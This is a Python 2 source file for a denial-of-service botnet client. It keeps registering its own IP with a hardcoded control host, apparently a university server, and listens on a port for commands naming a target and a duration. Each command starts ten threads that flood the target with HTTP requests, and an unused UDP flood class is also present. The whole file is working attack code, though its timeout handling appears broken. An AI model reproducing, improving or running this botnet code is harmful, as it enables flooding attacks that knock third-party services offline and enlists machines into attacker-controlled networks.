import SocketServer
import threading
import time
import socket
import urllib2
import random
import os

N = 10

class zombie(SocketServer.BaseRequestHandler):
    def handle(self):
        self.data = self.request.recv(1024).strip()
        timeout, target, port = self.data.split(" ")
        self.request.sendall("ACK")

        for i in xrange(N):
            attack = attackHTTPFlood(timeout, target)
            attack.start()

class attackUDPFlood(threading.Thread):
    def __init__(self, timeout, target, port):
        threading.Thread.__init__(self)
        self.timeout = int(timeout)
        self.target = target
        self.port = int(port)

    def run(self):
        victim = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        MESSAGE = os.urandom(1024)

        start = time.time()
        while time.time() - start < self.timeout:
            victim.sendto(MESSAGE, (self.target, self.port))

class attackHTTPFlood(threading.Thread):
    def __init__(self, timeout, target):
        threading.Thread.__init__(self)
        self.timeoutAttack = timeout
        self.target = "http://" + target

    def run(self):
        start = time.time()
        while time.time() - start < self.timeoutAttack:
            try:
                urllib2.urlopen(self.target)
            except IOError:
                print "Could not open ", self.target

class registerIP(threading.Thread):
    def __init__(self, HOST, PORT):
        threading.Thread.__init__(self)
        self.HOST = HOST
        self.PORT = PORT

    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.HOST, self.PORT))
            sock.sendall(socket.gethostbyname(socket.gethostname()))
            time.sleep(5)

class waitForInstructions(threading.Thread):
    def __init__(self, HOST, PORT):
        threading.Thread.__init__(self)
        self.HOST = HOST
        self.PORT = PORT

    def run(self):
        server = SocketServer.TCPServer((self.HOST, self.PORT), zombie)
        server.serve_forever()

if __name__ == '__main__':
    controlIP = "chunkeey.cs.washington.edu"
    zombieIP = socket.gethostbyname(socket.gethostname())
    controlPORT = 14000
    getInstrPORT = 15000

    instr = waitForInstructions(zombieIP, getInstrPORT)
    regis = registerIP(controlIP, controlPORT)

    instr.start()
    regis.start()
